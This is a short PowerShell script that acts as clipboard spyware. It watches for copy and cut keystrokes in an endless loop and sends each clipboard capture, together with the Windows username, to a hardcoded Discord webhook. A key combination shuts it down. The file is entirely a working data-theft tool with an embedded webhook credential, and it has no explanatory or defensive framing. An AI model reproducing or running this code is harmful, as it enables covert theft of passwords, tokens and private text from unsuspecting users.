Add-Type -AssemblyName WindowsBase
Add-Type -AssemblyName PresentationCore

function Send-ToDiscord {
    [CmdletBinding()]
    param (    
        [Parameter(Position=0, Mandatory=$true)]
        [string]$Content
    ) 

    $WebhookUrl = 'https://discord.com/api/webhooks/1213786836598784012/dk1zfoVl_1rOxQqQ1Z2Z6Hr-xYMi4HKwsKO5cBpQvSoUvDJZBScoT-NGMROLTSz3R2ZH'

    $Body = @{
        'username' = $env:username
        'content'  = $Content
    }

    Invoke-RestMethod -Uri $WebhookUrl -Method 'Post' -Body $Body
}

function Check-Clipboard {
    $ClipboardContent = Get-Clipboard

    if (-not [string]::IsNullOrEmpty($ClipboardContent)) {
        Send-ToDiscord -Content $ClipboardContent
    }
}

while ($true) {
    $LeftCtrlPressed  = [Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::LeftCtrl)
    $RightCtrlPressed = [Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::RightCtrl)
    $CKeyPressed      = [Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::C)
    $XKeyPressed      = [Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::X)

    if (($LeftCtrlPressed -or $RightCtrlPressed) -and ($CKeyPressed -or $XKeyPressed)) {
        Check-Clipboard
    }
    elseif ($RightCtrlPressed -and $LeftCtrlPressed) {
        Send-ToDiscord -Content "--------- Connection Lost ----------"
        exit
    }
    else {
        Start-Sleep -Milliseconds 100
    }
}
